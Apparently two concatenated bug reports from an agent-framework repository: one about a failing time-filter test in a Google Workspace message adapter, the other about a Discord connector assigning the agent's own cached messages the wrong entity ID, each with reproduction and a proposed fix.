Measured with pinned Bun 1.4.2:

```text
bun --conditions=eliza-source test plugins/plugin-google-workspace/src/lifeops-message-adapter.test.ts --test-name-pattern "filters channels and time"
0 pass, 1 fail
```

## Expected behavior

The provider query must be a conservative superset of the inclusive millisecond bound. Query the preceding whole second, then retain the existing exact local millisecond filter.
35:T4cc,## Problem

After #33750, stored Discord history and backfill map the connected account's own bot user to `runtime.agentId`, matching the send path. `DiscordService.getConnectorChatContext`, however, still maps every cached message author through `resolveDiscordEntityId`.

As a result, the same agent-authored message has two entity identities depending on which MessageConnector history surface returns it: cached chat context returns `createUniqueUuid(runtime, botUserId)`, while stored history returns `runtime.agentId`.

## Reproduction

On current `develop`, construct a Discord account whose client user is the author of a cached channel message, then call `getConnectorChatContext` for that account.

Expected: the own-bot cached message has `entityId === runtime.agentId`; other bot users retain their derived Discord entity IDs.

Actual: the own-bot cached message has the derived Discord entity ID.

The focused regression test fails on `develop` with the own-bot UUID mismatch while the existing stored-history and backfill assertions pass.

## Proposed fix

Reuse the account-scoped history-author resolver from `discord-history.ts` for cached connector context. Keep all other authors on `resolveDiscordEntityId`.
